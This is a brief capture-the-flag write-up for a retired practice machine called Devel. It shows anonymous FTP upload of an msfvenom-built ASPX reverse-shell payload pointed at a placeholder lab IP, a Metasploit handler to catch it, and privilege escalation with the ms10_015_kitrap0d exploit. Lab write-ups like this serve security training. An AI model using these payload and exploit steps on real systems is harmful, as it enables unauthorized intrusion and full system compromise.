# Devel 10.10.10.5 WriteUp
## Contents
- [Tools](#tools)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Priviledge Escalation](#priviledge-escalation)

Retired Easy Machine by ch4p

## Tools
1. Nmap
2. ftp
3. Metasploit

## Enumeration

1. Nmap shows port 21 and 80 is open.

## Exploitation

1. FTP anynymous login was enabled. So, exploited it with `put shell.aspx` to upload msfvenom shell.
msfvenom command used,
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx > shell.aspx`
2. Then used `/multi/handler` to get reverse tcp connection from the shell on metasploit as user `IIS APPPOOL\Web`.

## Priviledge Escalation

1. Used `local_exploit_suggester` module for this.
2. After trying some suggested exploit `exploit/windows/local/ms10_015_kitrap0d` worked. The flags can now be obtained from
c:\Users\babis\Desktop\user.txt.txt​ and c​ :\Users\Administrator\Desktop\root.txt.txt

Author: Zishan Ahamed Thandar
